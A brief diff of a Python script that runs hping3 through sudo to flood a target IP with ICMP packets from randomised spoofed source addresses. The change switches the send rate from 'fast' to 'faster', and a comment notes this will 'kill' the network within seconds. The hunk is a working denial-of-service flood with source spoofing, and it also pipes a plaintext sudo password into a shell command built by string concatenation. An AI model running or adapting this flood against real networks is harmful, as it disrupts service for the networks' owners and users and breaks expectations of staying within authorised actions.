@@ -9,4 +9,4 @@ sudoPassword = ''
 
 # You can use faster instead of fast, but this will result in a lot faster overload of the table
 # and will ''kill'' the network after a few seconds.
-os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --fast -c " + packages + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
+os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --faster -c " + packages + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
